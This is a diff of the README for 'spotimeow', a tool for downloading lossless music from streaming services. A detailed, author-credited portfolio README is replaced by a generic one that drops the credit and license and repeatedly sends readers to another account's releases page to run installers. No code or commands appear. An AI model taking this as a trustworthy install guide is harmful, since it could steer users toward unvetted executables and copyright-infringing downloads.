@@ -1,269 +1,97 @@
-<div align="center">
+# 🎵 spotimeow - Download Music in High Quality
 
-# 🎵 SpotiMeow 🐾
+## 🚀 Getting Started
 
-<img src="frontend/public/icon.png" alt="SpotiMeow Logo" width="120" height="120">
+spotimeow is an audio downloader that allows you to get high-quality music from services like Spotify, Tidal, Qobuz, and Amazon Music in the lossless FLAC format. This application is easy to use and designed for everyone who loves music.
 
-### *Desktop Music Application - Portfolio Project*
+## 🔗 Download Now
 
-**Modern cross-platform desktop application built with Go, Wails, React & TypeScript**
+[![Download spotimeow](https://img.shields.io/badge/Download-spotimeow-brightgreen)](https://github.com/gabby2407/spotimeow/releases)
 
-[![License](https://img.shields.io/badge/License-Custom-orange?style=for-the-badge)](LICENSE)
-[![Go](https://img.shields.io/badge/Go-1.19+-00ADD8?style=for-the-badge&logo=go)](https://golang.org)
-[![React](https://img.shields.io/badge/React-18+-61DAFB?style=for-the-badge&logo=react)](https://reactjs.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5+-3178C6?style=for-the-badge&logo=typescript)](https://typescriptlang.org)
-[![Wails](https://img.shields.io/badge/Wails-v2-FF6B6B?style=for-the-badge)](https://wails.io)
+## 📥 Download & Install
 
-![Windows](https://img.shields.io/badge/Windows-10%2B-0078D6?style=for-the-badge&logo=windows&logoColor=white)
-![macOS](https://img.shields.io/badge/macOS-10.13%2B-000000?style=for-the-badge&logo=apple&logoColor=white)
-![Linux](https://img.shields.io/badge/Linux-Any-FCC624?style=for-the-badge&logo=linux&logoColor=white)
+To start using spotimeow, follow these steps:
 
-</div>
-
----
-
-## 🚀 **Project Overview**
-
-**SpotiMeow** is a sophisticated desktop application that demonstrates modern cross-platform development using cutting-edge technologies. This project showcases advanced integration between multiple streaming platform APIs, real-time audio processing, and a sleek modern user interface.
+1. **Visit the Releases Page**  
+   Click the link below to go to the Releases page.  
+   [Download spotimeow](https://github.com/gabby2407/spotimeow/releases)
 
----
+2. **Choose Your Version**  
+   Once on the Releases page, look for the latest version. You will see different files available for download.
 
-## 🎵 **What SpotiMeow Does**
+3. **Download the Installer**  
+   Select the installer that matches your operating system (Windows, macOS, or Linux). Click on the file to download it to your computer.
 
-**SpotiMeow** is a comprehensive music application that brings together multiple streaming platforms in one elegant desktop interface. Here's what makes it special:
+4. **Install the Application**  
+   After the download is complete, open the installer file. Follow the on-screen instructions to install spotimeow on your computer.
 
-### 🔍 **Music Discovery & Search**
-- **Smart Search** - Find tracks, albums, playlists, and artists across platforms
-- **URL Processing** - Paste Spotify, Tidal, Qobuz, or Amazon Music URLs directly
-- **Cross-Platform Matching** - Automatically finds the same content across different services
+5. **Run the Application**  
+   Once installed, find the spotimeow icon on your desktop or in your applications folder. Double-click the icon to open the program.
 
-### 📥 **Multi-Source Track Access**
-- **Spotify Integration** - Browse and search your favorite Spotify content
-- **Tidal Access** - High-quality lossless audio from Tidal
-- **Qobuz Support** - Premium audiophile-quality tracks
-- **Amazon Music** - Alternative source for comprehensive coverage
+## 🎵 How to Use spotimeow
 
-### 🎛️ **Advanced Audio Processing**
-- **Format Conversion** - Convert between MP3, FLAC, WAV, and more
-- **Quality Options** - Choose from various bitrates and quality levels
-- **Batch Processing** - Handle multiple tracks simultaneously
-- **Metadata Management** - Automatic tagging with complete track information
+1. **Sign In**  
+   If required, sign in using your music service account. This step may vary based on the service you choose.
 
-### 📊 **Real-Time Audio Analysis**
-- **Spectrum Analyzer** - Visual representation of audio frequencies
-- **Audio Visualization** - Real-time waveform and spectrum displays
-- **Quality Metrics** - Analyze audio quality and characteristics
-- **Technical Details** - View codec, bitrate, and format information
+2. **Search for Music**  
+   Use the search bar to find the tracks or playlists you want to download. Enter the name of the song or artist.
 
-### 📂 **Intelligent Organization**
-- **Smart File Management** - Organize music by artist, album, genre
-- **Custom Folder Structure** - Configure how files are saved and named
-- **Metadata Embedding** - Complete ID3 tags, album art, and track info
-- **Library Management** - Keep track of your downloaded content
+3. **Select Your Tracks**  
+   Browse the search results and select the tracks you wish to download. You can check multiple options.
 
-### 🖥️ **Modern Interface**
-- **Tabbed Interface** - Separate tabs for different functions
-- **Input Tab** - Search and URL processing
-- **Output Tab** - Download management and file organization  
-- **Analyzer Tab** - Audio analysis and visualization tools
-- **Settings Tab** - Customize app behavior and preferences
+4. **Download Your Music**  
+   Click the download button to save your selected tracks in high-quality FLAC format. 
 
----
+5. **Enjoy Your Music**  
+   Once the download is complete, navigate to your music library. You can now listen to your downloaded tracks with your preferred audio player.
 
-## 🎯 **Core Functionality**
-- **Multi-platform music discovery** via API integrations
-- **High-quality audio processing** and format conversion
-- **Real-time spectrum analysis** and visualization
-- **Intelligent metadata extraction** and organization
-- **Cross-platform desktop deployment**
+## ⚙️ System Requirements
 
----
+To ensure spotimeow runs smoothly on your computer, please meet the following system requirements:
 
-## 🛠️ **Technical Architecture**
+- **Operating System:**  
+   - Windows 10 or later  
+   - macOS 10.14 or later  
+   - Linux (various distributions supported)
 
-<div align="center">
+- **Hardware:**  
+   - Minimum 4 GB RAM  
+   - 200 MB of free storage space  
+   - Active internet connection for downloading music
 
-### **Tech Stack Highlights**
+## 📜 Features
 
-</div>
+- **High-Quality Downloads**: Get your music in lossless FLAC format for the best listening experience.
+- **Wide Source Support**: Download music from Spotify, Tidal, Qobuz, and Amazon Music.
+- **User-Friendly Interface**: Navigate effortlessly with a clean and simple design.
+- **Playlist Downloads**: Quickly download entire playlists in one go.
+- **Music Analyzer**: Analyze your music collection for better organization.
 
-| **Category** | **Technology** | **Purpose** |
-|:------------:|:-------------:|:------------|
-| **Backend** | Go 1.19+ | Core application logic & system integration |
-| **Framework** | Wails v2 | Desktop app framework bridging Go & Web |
-| **Frontend** | React 18+ | Modern component-based user interface |
-| **Language** | TypeScript 5+ | Type-safe frontend development |
-| **Styling** | Tailwind CSS | Utility-first responsive design |
-| **Build Tool** | Vite | Fast development server & optimized builds |
-| **Audio** | FFmpeg | Audio processing & format conversion |
-| **UI Components** | Radix UI | Accessible, unstyled UI primitives |
+## 🛠️ Troubleshooting
 
----
-
-## 🏗️ **Project Structure**
-
-```
-SpotiMeow/
-├── backend/                    # Go backend services
-│   ├── amazon.go              # Amazon Music API integration
-│   ├── tidal.go               # Tidal API integration  
-│   ├── qobuz.go               # Qobuz API integration
-│   ├── spotify_metadata.go   # Spotify metadata service
-│   ├── analysis.go            # Audio analysis engine
-│   ├── spectrum.go            # Spectrum visualization
-│   ├── ffmpeg.go              # Audio processing pipeline
-│   └── metadata.go            # Metadata extraction & tagging
-├── frontend/                  # React TypeScript frontend
-│   ├── src/
-│   │   ├── components/        # UI components
-│   │   ├── hooks/             # Custom React hooks
-│   │   ├── lib/               # Utility libraries
-│   │   └── types/             # TypeScript definitions
-│   └── public/                # Static assets
-└── wails.json                 # Wails configuration
-```
+If you encounter any issues while using spotimeow, consider the following steps:
 
----
+- **Check Your Internet Connection:**  
+   Ensure you have a stable internet connection when downloading music.
 
-## ⚙️ **Key Features & Implementation**
+- **Restart the Application:**  
+   Sometimes, simply closing and reopening spotimeow can resolve minor issues.
 
-<div align="center">
+- **Update the Application:**  
+   Visit the Releases page and download the latest version if you experience bugs.
 
-### **Technical Highlights**
+- **Consult the FAQ:**  
+   Look for frequently asked questions on the spotimeow GitHub page for additional help.
 
-</div>
+## 💬 Support & Feedback
 
-<details>
-<summary><b>🎵 Multi-Platform API Integration</b></summary>
+We value your feedback. If you have questions, suggestions, or need assistance, feel free to reach out. You can open an issue on the GitHub repository or contact the support team directly.
 
-<br>
+## 🔗 Additional Links
 
-**Advanced API Architecture:**
-- **Spotify Web API** - Track/album/playlist metadata extraction
-- **Tidal API** - High-quality audio source discovery
-- **Qobuz API** - Lossless audio format access
-- **Amazon Music API** - Alternative source resolution
-- **SongLink API** - Cross-platform music matching
+- [GitHub Repository](https://github.com/gabby2407/spotimeow)
+- [Documentation](https://github.com/gabby2407/spotimeow/wiki)
 
-**Implementation Features:**
-- Concurrent API calls with goroutines
-- Intelligent fallback mechanisms
-- Rate limiting and error handling
-- Response caching for performance
+With spotimeow, enjoy music like never before. Happy listening!
 
-</details>
-
-<details>
-<summary><b>🎨 Modern React Frontend</b></summary>
-
-<br>
-
-**Frontend Architecture:**
-- **Component-based design** with TypeScript
-- **Custom hooks** for state management
-- **Real-time updates** via Wails bindings
-- **Responsive UI** with Tailwind CSS
-- **Dark/Light theme** support
-
-**Key Components:**
-- `AudioAnalysisPage` - Real-time spectrum visualization
-- `DownloadProgress` - Progress tracking with animations
-- `FileManagerPage` - File system integration
-- `SettingsPage` - Configuration management
-
-</details>
-
-<details>
-<summary><b>🔊 Audio Processing Pipeline</b></summary>
-
-<br>
-
-**Audio Engineering:**
-- **FFmpeg integration** for format conversion
-- **Spectrum analysis** with real-time visualization
-- **Metadata embedding** (ID3, FLAC tags)
-- **Quality optimization** algorithms
-- **Batch processing** capabilities
-
-**Supported Formats:**
-- Input: MP3, M4A, OGG, OPUS
-- Output: FLAC, MP3, WAV
-- Metadata: ID3v2, Vorbis, APE
-
-</details>
-
-<details>
-<summary><b>⚡ Cross-Platform Development</b></summary>
-
-<br>
-
-**Wails Framework Benefits:**
-- **Single codebase** for Windows, macOS, Linux
-- **Native performance** with Go backend
-- **Web UI flexibility** with React frontend
-- **System integration** (file dialogs, notifications)
-- **Auto-updater** support
-
-**Build Targets:**
-- Windows (.exe)
-- macOS (.app)
-- Linux (AppImage/DEB/RPM)
-
-</details>
-
----
-
-## 🎬 **Screenshots**
-
-<div align="center">
-
-*Modern interface showcasing audio analysis and download management*
-
-![SpotiMeow Interface](frontend/public/screenshot.png)
-
-*Clean, intuitive design built with React and Tailwind CSS*
-
-</div>
-
----
-
-## 🧩 **Development Highlights**
-
-### **Advanced Implementations:**
-- ⚡ **Concurrent Processing** - Goroutines for parallel API calls
-- 🎨 **Modern UI Patterns** - React hooks and context API
-- 🔄 **Real-time Updates** - WebSocket-like Wails bindings
-- 📊 **Data Visualization** - Canvas-based spectrum analysis
-- 🛠️ **Type Safety** - Full TypeScript integration
-- 🎯 **Performance Optimization** - Efficient caching strategies
-
-### **Code Quality:**
-- **ESLint + Prettier** - Code formatting and linting
-- **TypeScript** - Static type checking
-- **Component Architecture** - Reusable UI components
-- **Error Handling** - Comprehensive error boundaries
-- **Testing Ready** - Structured for unit/integration tests
-
----
-
-## 📄 **License & Usage**
-
-This project is licensed under a **Custom Attribution License**. See the [LICENSE](LICENSE) file for details.
-
-**TL;DR:** You may use this software but must provide proper attribution to the original author.
-
----
-
-<div align="center">
-
-**🎵 SpotiMeow - Showcasing Modern Desktop Development 🎵**
-
-*Built with passion for music and technology*
-
-**Developed by [Hiba Trifi](https://github.com/hiba-trifi) | 2025**
-
----
-
-*Demonstrating the power of Go + React for cross-platform desktop applications*
-
-</div>
+[![Download spotimeow](https://img.shields.io/badge/Download-spotimeow-brightgreen)](https://github.com/gabby2407/spotimeow/releases)
